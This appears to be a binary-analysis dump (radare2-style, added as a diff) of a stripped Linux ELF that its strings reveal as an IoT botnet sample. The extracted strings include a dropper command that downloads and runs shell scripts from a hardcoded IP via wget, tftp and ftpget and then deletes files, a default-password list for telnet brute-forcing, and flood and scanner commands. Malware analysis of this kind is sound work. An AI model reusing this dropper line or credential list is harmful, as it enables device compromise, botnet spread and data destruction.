@@ -1,0 +1,296 @@
+Missing bin header main
+Missing bin header dwarf
+[Sections]
+
+nth paddr         size vaddr        vsize perm name
+―――――――――――――――――――――――――――――――――――――――――――――――――――
+0   0x00000000     0x0 0x00000000     0x0 ---- 
+1   0x000000e8    0x13 0x004000e8    0x13 -r-x .init
+2   0x00000100  0xc6f8 0x00400100  0xc6f8 -r-x .text
+3   0x0000c7f8     0xe 0x0040c7f8     0xe -r-x .fini
+4   0x0000c820  0x24d0 0x0040c820  0x24d0 -r-- .rodata
+5   0x0000ecf0     0x4 0x0040ecf0     0x4 -r-- .eh_frame
+6   0x0000f000    0x10 0x0050f000    0x10 -rw- .ctors
+7   0x0000f010    0x10 0x0050f010    0x10 -rw- .dtors
+8   0x0000f020     0x8 0x0050f020     0x8 -rw- .jcr
+9   0x0000f040   0x510 0x0050f040   0x510 -rw- .data
+10  0x0000f550     0x0 0x0050f560  0x68e8 -rw- .bss
+11  0x0000f550   0x8b8 0x00000000   0x8b8 ---- .comment
+12  0x0000fe08    0x56 0x00000000    0x56 ---- .shstrtab
+
+[Segments]
+
+nth paddr         size vaddr        vsize perm name
+―――――――――――――――――――――――――――――――――――――――――――――――――――
+0   0x00000000  0xecf4 0x00400000  0xecf4 -r-x LOAD0
+1   0x0000f000   0x550 0x0050f000  0x6e48 -rw- LOAD1
+2   0x00000000     0x0 0x00000000     0x0 -rw- GNU_STACK
+3   0x00000000    0x40 0x00400000    0x40 -rw- ehdr
+
+[Entrypoints]
+vaddr=0x00400194 paddr=0x00000194 haddr=0x00000018 hvaddr=0x00400018 type=program
+
+1 entrypoints
+[Constructors]
+
+0 entrypoints
+[Imports]
+nth vaddr bind type lib name
+――――――――――――――――――――――――――――
+
+[Symbols]
+
+nth paddr vaddr bind type size lib name
+―――――――――――――――――――――――――――――――――――――――
+[Strings]
+nth paddr      vaddr      len size section type    string
+―――――――――――――――――――――――――――――――――――――――――――――――――――――――――
+0   0x0000c820 0x0040c820 409 410  .rodata ascii   cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://206.189.233.129/bins.sh; chmod 777 bins.sh; sh bins.sh; tftp 206.189.233.129 -c get tftp1.sh; chmod 777 tftp1.sh; sh tftp1.sh; tftp -r tftp2.sh -g 206.189.233.129; chmod 777 tftp2.sh; sh tftp2.sh; ftpget -v -u anonymous -p anonymous -P 21 206.189.233.129 ftp1.sh ftp1.sh; sh ftp1.sh; rm -rf bins.sh tftp1.sh tftp2.sh ftp1.sh; rm -rf *; exit\r\n
+1   0x0000c9ba 0x0040c9ba 18  19   .rodata ascii   206.189.233.129:23
+2   0x0000c9cd 0x0040c9cd 4   5    .rodata ascii   root
+3   0x0000c9d3 0x0040c9d3 5   6    .rodata ascii   admin
+4   0x0000c9da 0x0040c9da 4   5    .rodata ascii   user
+5   0x0000c9e0 0x0040c9e0 5   6    .rodata ascii   login
+6   0x0000c9e7 0x0040c9e7 5   6    .rodata ascii   guest
+7   0x0000c9ee 0x0040c9ee 7   8    .rodata ascii   support
+8   0x0000c9f7 0x0040c9f7 4   5    .rodata ascii   toor
+9   0x0000c9fd 0x0040c9fd 8   9    .rodata ascii   changeme
+10  0x0000ca07 0x0040ca07 4   5    .rodata ascii   1234
+11  0x0000ca0d 0x0040ca0d 5   6    .rodata ascii   12345
+12  0x0000ca14 0x0040ca14 6   7    .rodata ascii   123456
+13  0x0000ca1c 0x0040ca1c 7   8    .rodata ascii   default
+14  0x0000ca27 0x0040ca27 8   9    .rodata ascii   password
+15  0x0000ca31 0x0040ca31 6   7    .rodata ascii   (null)
+16  0x0000ca38 0x0040ca38 8   9    .rodata ascii   buf: %s\n
+17  0x0000ca47 0x0040ca47 7   8    .rodata ascii   /bin/sh
+18  0x0000d260 0x0040d260 13  14   .rodata ascii   /proc/cpuinfo
+19  0x0000d26e 0x0040d26e 8   9    .rodata ascii   BOGOMIPS
+20  0x0000d277 0x0040d277 4   5    .rodata ascii   PING
+21  0x0000d27c 0x0040d27c 5   6    .rodata ascii   :>%$#
+22  0x0000d283 0x0040d283 11  12   .rodata ascii   %d.%d.%d.%d
+23  0x0000d28f 0x0040d28f 5   6    .rodata ascii   ogin:
+24  0x0000d298 0x0040d298 8   9    .rodata ascii   assword:
+25  0x0000d2a1 0x0040d2a1 8   9    .rodata ascii   ncorrect
+26  0x0000d2aa 0x0040d2aa 4   5    .rodata ascii   sh\r\n
+27  0x0000d2af 0x0040d2af 15  16   .rodata ascii   REPORT %s:%s:%s
+28  0x0000d308 0x0040d308 26  27   .rodata ascii   Failed opening raw socket.
+29  0x0000d328 0x0040d328 32  33   .rodata ascii   Failed setting raw headers mode.
+30  0x0000d365 0x0040d365 17  18   .rodata ascii   Invalid flag "%s"
+31  0x0000d377 0x0040d377 5   6    .rodata ascii   PONG!
+32  0x0000d37d 0x0040d37d 10  11   .rodata ascii   GETLOCALIP
+33  0x0000d388 0x0040d388 9   10   .rodata ascii   My IP: %s
+34  0x0000d392 0x0040d392 7   8    .rodata ascii   SCANNER
+35  0x0000d39a 0x0040d39a 16  17   .rodata ascii   SCANNER ON | OFF
+36  0x0000d3af 0x0040d3af 14  15   .rodata ascii   REMOVING PROBE
+37  0x0000d3c1 0x0040d3c1 7   8    .rodata ascii   PROBING
+38  0x0000d3c9 0x0040d3c9 4   5    .rodata ascii   HOLD
+39  0x0000d3ce 0x0040d3ce 4   5    .rodata ascii   JUNK
+40  0x0000d3d7 0x0040d3d7 4   5    .rodata ascii   HTTP
+41  0x0000d3e0 0x0040d3e0 5   6    .rodata ascii   COMBO
+42  0x0000d3ea 0x0040d3ea 8   9    .rodata ascii   KILLATTK
+43  0x0000d3f3 0x0040d3f3 7   8    .rodata ascii   FUCKOFF
+44  0x0000d3fb 0x0040d3fb 7   8    .rodata ascii   8.8.8.8
+45  0x0000d403 0x0040d403 15  16   .rodata ascii   /proc/net/route
+46  0x0000d413 0x0040d413 10  11   .rodata ascii   \t00000000\t
+47  0x0000d41e 0x0040d41e 5   6    .rodata ascii   DONGS
+48  0x0000d424 0x0040d424 18  19   .rodata ascii   /usr/sbin/dropbear
+49  0x0000d437 0x0040d437 9   10   .rodata ascii   BUILD %s\n
+50  0x0000d444 0x0040d444 8   9    .rodata ascii   BUILD %s
+51  0x0000d44d 0x0040d44d 4   5    .rodata ascii   PONG
+52  0x0000d459 0x0040d459 7   8    .rodata ascii   %s 2>&1
+53  0x0000d88e 0x0040d88e 7   16   .rodata utf16le \a\b\t\n\v\f\r
+54  0x0000d8c0 0x0040d8c0 95  192  .rodata utf16le  !"#$%&'()*+,-./0123456789:;<=>?@ABCDEFGHIJKLMNOPQRSTUVWXYZ[\]^_`ABCDEFGHIJKLMNOPQRSTUVWXYZ{|}~
+55  0x0000da83 0x0040da83 7   8    .rodata ascii   /bin/sh
+56  0x0000dac8 0x0040dac8 5   6    .rodata ascii   (nil)
+57  0x0000dace 0x0040dace 6   7    .rodata ascii   (null)
+58  0x0000dae4 0x0040dae4 4   5    .rodata ascii   \b\n\n\n
+59  0x0000daf0 0x0040daf0 8   9    .rodata ascii   hlLjztqZ
+60  0x0000db40 0x0040db40 20  21   .rodata ascii   npxXoudifFeEgGaACScs
+61  0x0000db55 0x0040db55 7   8    .rodata ascii    +0-#'I
+62  0x0000db84 0x0040db84 14  15   .rodata ascii   Unknown error 
+63  0x0000dba0 0x0040dba0 7   8    .rodata ascii   Success
+64  0x0000dba8 0x0040dba8 23  24   .rodata ascii   Operation not permitted
+65  0x0000dbc0 0x0040dbc0 25  26   .rodata ascii   No such file or directory
+66  0x0000dbda 0x0040dbda 15  16   .rodata ascii   No such process
+67  0x0000dbea 0x0040dbea 23  24   .rodata ascii   Interrupted system call
+68  0x0000dc02 0x0040dc02 18  19   .rodata ascii   Input/output error
+69  0x0000dc15 0x0040dc15 25  26   .rodata ascii   No such device or address
+70  0x0000dc2f 0x0040dc2f 22  23   .rodata ascii   Argument list too long
+71  0x0000dc46 0x0040dc46 17  18   .rodata ascii   Exec format error
+72  0x0000dc58 0x0040dc58 19  20   .rodata ascii   Bad file descriptor
+73  0x0000dc6c 0x0040dc6c 18  19   .rodata ascii   No child processes
+74  0x0000dc7f 0x0040dc7f 32  33   .rodata ascii   Resource temporarily unavailable
+75  0x0000dca0 0x0040dca0 22  23   .rodata ascii   Cannot allocate memory
+76  0x0000dcb7 0x0040dcb7 17  18   .rodata ascii   Permission denied
+77  0x0000dcc9 0x0040dcc9 11  12   .rodata ascii   Bad address
+78  0x0000dcd5 0x0040dcd5 21  22   .rodata ascii   Block device required
+79  0x0000dceb 0x0040dceb 23  24   .rodata ascii   Device or resource busy
+80  0x0000dd03 0x0040dd03 11  12   .rodata ascii   File exists
+81  0x0000dd0f 0x0040dd0f 25  26   .rodata ascii   Invalid cross-device link
+82  0x0000dd29 0x0040dd29 14  15   .rodata ascii   No such device
+83  0x0000dd38 0x0040dd38 15  16   .rodata ascii   Not a directory
+84  0x0000dd48 0x0040dd48 14  15   .rodata ascii   Is a directory
+85  0x0000dd57 0x0040dd57 16  17   .rodata ascii   Invalid argument
+86  0x0000dd68 0x0040dd68 29  30   .rodata ascii   Too many open files in system
+87  0x0000dd86 0x0040dd86 19  20   .rodata ascii   Too many open files
+88  0x0000dd9a 0x0040dd9a 30  31   .rodata ascii   Inappropriate ioctl for device
+89  0x0000ddb9 0x0040ddb9 14  15   .rodata ascii   Text file busy
+90  0x0000ddc8 0x0040ddc8 14  15   .rodata ascii   File too large
+91  0x0000ddd7 0x0040ddd7 23  24   .rodata ascii   No space left on device
+92  0x0000ddef 0x0040ddef 12  13   .rodata ascii   Illegal seek
+93  0x0000ddfc 0x0040ddfc 21  22   .rodata ascii   Read-only file system
+94  0x0000de12 0x0040de12 14  15   .rodata ascii   Too many links
+95  0x0000de21 0x0040de21 11  12   .rodata ascii   Broken pipe
+96  0x0000de2d 0x0040de2d 32  33   .rodata ascii   Numerical argument out of domain
+97  0x0000de4e 0x0040de4e 29  30   .rodata ascii   Numerical result out of range
+98  0x0000de6c 0x0040de6c 25  26   .rodata ascii   Resource deadlock avoided
+99  0x0000de86 0x0040de86 18  19   .rodata ascii   File name too long
+100 0x0000de99 0x0040de99 18  19   .rodata ascii   No locks available
+101 0x0000deac 0x0040deac 24  25   .rodata ascii   Function not implemented
+102 0x0000dec5 0x0040dec5 19  20   .rodata ascii   Directory not empty
+103 0x0000ded9 0x0040ded9 33  34   .rodata ascii   Too many levels of symbolic links
+104 0x0000defc 0x0040defc 26  27   .rodata ascii   No message of desired type
+105 0x0000df17 0x0040df17 18  19   .rodata ascii   Identifier removed
+106 0x0000df2a 0x0040df2a 27  28   .rodata ascii   Channel number out of range
+107 0x0000df46 0x0040df46 24  25   .rodata ascii   Level 2 not synchronized
+108 0x0000df5f 0x0040df5f 14  15   .rodata ascii   Level 3 halted
+109 0x0000df6e 0x0040df6e 13  14   .rodata ascii   Level 3 reset
+110 0x0000df7c 0x0040df7c 24  25   .rodata ascii   Link number out of range
+111 0x0000df95 0x0040df95 28  29   .rodata ascii   Protocol driver not attached
+112 0x0000dfb2 0x0040dfb2 26  27   .rodata ascii   No CSI structure available
+113 0x0000dfcd 0x0040dfcd 14  15   .rodata ascii   Level 2 halted
+114 0x0000dfdc 0x0040dfdc 16  17   .rodata ascii   Invalid exchange
+115 0x0000dfed 0x0040dfed 26  27   .rodata ascii   Invalid request descriptor
+116 0x0000e008 0x0040e008 13  14   .rodata ascii   Exchange full
+117 0x0000e016 0x0040e016 8   9    .rodata ascii   No anode
+118 0x0000e01f 0x0040e01f 20  21   .rodata ascii   Invalid request code
+119 0x0000e034 0x0040e034 12  13   .rodata ascii   Invalid slot
+120 0x0000e042 0x0040e042 20  21   .rodata ascii   Bad font file format
+121 0x0000e057 0x0040e057 19  20   .rodata ascii   Device not a stream
+122 0x0000e06b 0x0040e06b 17  18   .rodata ascii   No data available
+123 0x0000e07d 0x0040e07d 13  14   .rodata ascii   Timer expired
+124 0x0000e08b 0x0040e08b 24  25   .rodata ascii   Out of streams resources
+125 0x0000e0a4 0x0040e0a4 29  30   .rodata ascii   Machine is not on the network
+126 0x0000e0c2 0x0040e0c2 21  22   .rodata ascii   Package not installed
+127 0x0000e0d8 0x0040e0d8 16  17   .rodata ascii   Object is remote
+128 0x0000e0e9 0x0040e0e9 21  22   .rodata ascii   Link has been severed
+129 0x0000e0ff 0x0040e0ff 15  16   .rodata ascii   Advertise error
+130 0x0000e10f 0x0040e10f 13  14   .rodata ascii   Srmount error
+131 0x0000e11d 0x0040e11d 27  28   .rodata ascii   Communication error on send
+132 0x0000e139 0x0040e139 14  15   .rodata ascii   Protocol error
+133 0x0000e148 0x0040e148 18  19   .rodata ascii   Multihop attempted
+134 0x0000e15b 0x0040e15b 18  19   .rodata ascii   RFS specific error
+135 0x0000e16e 0x0040e16e 11  12   .rodata ascii   Bad message
+136 0x0000e17a 0x0040e17a 37  38   .rodata ascii   Value too large for defined data type
+137 0x0000e1a0 0x0040e1a0 26  27   .rodata ascii   Name not unique on network
+138 0x0000e1bb 0x0040e1bb 28  29   .rodata ascii   File descriptor in bad state
+139 0x0000e1d8 0x0040e1d8 22  23   .rodata ascii   Remote address changed
+140 0x0000e1ef 0x0040e1ef 38  39   .rodata ascii   Can not access a needed shared library
+141 0x0000e216 0x0040e216 36  37   .rodata ascii   Accessing a corrupted shared library
+142 0x0000e23b 0x0040e23b 31  32   .rodata ascii   .lib section in a.out corrupted
+143 0x0000e25b 0x0040e25b 47  48   .rodata ascii   Attempting to link in too many shared libraries
+144 0x0000e28b 0x0040e28b 37  38   .rodata ascii   Cannot exec a shared library directly
+145 0x0000e2b1 0x0040e2b1 49  50   .rodata ascii   Invalid or incomplete multibyte or wide character
+146 0x0000e2e3 0x0040e2e3 43  44   .rodata ascii   Interrupted system call should be restarted
+147 0x0000e30f 0x0040e30f 18  19   .rodata ascii   Streams pipe error
+148 0x0000e322 0x0040e322 14  15   .rodata ascii   Too many users
+149 0x0000e331 0x0040e331 30  31   .rodata ascii   Socket operation on non-socket
+150 0x0000e350 0x0040e350 28  29   .rodata ascii   Destination address required
+151 0x0000e36d 0x0040e36d 16  17   .rodata ascii   Message too long
+152 0x0000e37e 0x0040e37e 30  31   .rodata ascii   Protocol wrong type for socket
+153 0x0000e39d 0x0040e39d 22  23   .rodata ascii   Protocol not available
+154 0x0000e3b4 0x0040e3b4 22  23   .rodata ascii   Protocol not supported
+155 0x0000e3cb 0x0040e3cb 25  26   .rodata ascii   Socket type not supported
+156 0x0000e3e5 0x0040e3e5 23  24   .rodata ascii   Operation not supported
+157 0x0000e3fd 0x0040e3fd 29  30   .rodata ascii   Protocol family not supported
+158 0x0000e41b 0x0040e41b 40  41   .rodata ascii   Address family not supported by protocol
+159 0x0000e444 0x0040e444 22  23   .rodata ascii   Address already in use
+160 0x0000e45b 0x0040e45b 31  32   .rodata ascii   Cannot assign requested address
+161 0x0000e47b 0x0040e47b 15  16   .rodata ascii   Network is down
+162 0x0000e48b 0x0040e48b 22  23   .rodata ascii   Network is unreachable
+163 0x0000e4a2 0x0040e4a2 35  36   .rodata ascii   Network dropped connection on reset
+164 0x0000e4c6 0x0040e4c6 32  33   .rodata ascii   Software caused connection abort
+165 0x0000e4e7 0x0040e4e7 24  25   .rodata ascii   Connection reset by peer
+166 0x0000e500 0x0040e500 25  26   .rodata ascii   No buffer space available
+167 0x0000e51a 0x0040e51a 39  40   .rodata ascii   Transport endpoint is already connected
+168 0x0000e542 0x0040e542 35  36   .rodata ascii   Transport endpoint is not connected
+169 0x0000e566 0x0040e566 45  46   .rodata ascii   Cannot send after transport endpoint shutdown
+170 0x0000e594 0x0040e594 34  35   .rodata ascii   Too many references: cannot splice
+171 0x0000e5b7 0x0040e5b7 20  21   .rodata ascii   Connection timed out
+172 0x0000e5cc 0x0040e5cc 18  19   .rodata ascii   Connection refused
+173 0x0000e5df 0x0040e5df 12  13   .rodata ascii   Host is down
+174 0x0000e5ec 0x0040e5ec 16  17   .rodata ascii   No route to host
+175 0x0000e5fd 0x0040e5fd 29  30   .rodata ascii   Operation already in progress
+176 0x0000e61b 0x0040e61b 25  26   .rodata ascii   Operation now in progress
+177 0x0000e635 0x0040e635 21  22   .rodata ascii   Stale NFS file handle
+178 0x0000e64b 0x0040e64b 24  25   .rodata ascii   Structure needs cleaning
+179 0x0000e664 0x0040e664 27  28   .rodata ascii   Not a XENIX named type file
+180 0x0000e680 0x0040e680 29  30   .rodata ascii   No XENIX semaphores available
+181 0x0000e69e 0x0040e69e 20  21   .rodata ascii   Is a named type file
+182 0x0000e6b3 0x0040e6b3 16  17   .rodata ascii   Remote I/O error
+183 0x0000e6c4 0x0040e6c4 19  20   .rodata ascii   Disk quota exceeded
+184 0x0000e6d8 0x0040e6d8 15  16   .rodata ascii   No medium found
+185 0x0000e6e8 0x0040e6e8 17  18   .rodata ascii   Wrong medium type
+186 0x0000ebd8 0x0040ebd8 9   10   .rodata ascii   /dev/null
+187 0x0000ebeb 0x0040ebeb 5   6    .rodata ascii   L(knN
+0   0x0000f514 0x0050f514 6   9    .data   utf8    箂CAk[S blocks=CJK Unified Ideographs,Basic Latin
+arch     x86
+baddr    0x400000
+binsz    65118
+bintype  elf
+bits     64
+canary   false
+class    ELF64
+compiler GCC: (GNU) 4.1.2
+crypto   false
+endian   little
+havecode true
+laddr    0x0
+lang     c
+linenum  false
+lsyms    false
+machine  AMD x86-64 architecture
+nx       true
+os       linux
+pic      false
+relocs   false
+rpath    NONE
+sanitize false
+static   true
+stripped true
+subsys   linux
+va       true
+0x00000000  ELF64       0x464c457f
+0x00000010  Type        0x0002
+0x00000012  Machine     0x003e
+0x00000014  Version     0x00000001
+0x00000018  Entrypoint  0x00400194
+0x00000020  PhOff       0x00000040
+0x00000028  ShOff       0x0000fe60
+0x00000030  Flags       0x00000000
+0x00000034  EhSize      64
+0x00000036  PhentSize   56
+0x00000038  PhNum       3
+0x0000003a  ShentSize   64
+0x0000003c  ShNum       13
+0x0000003e  ShrStrndx   12
+[Linked libraries]
+
+0 library
+[Relocations]
+
+vaddr paddr type name
+―――――――――――――――――――――
+
+
+0 relocations
+65118
+Section to Segment mapping:
+Segment   Section
+-----------------
+LOAD0     .init .text .fini .rodata .eh_frame 
+LOAD1     .ctors .dtors .jcr .data 
+GNU_STACK 
+ehdr      
+
+
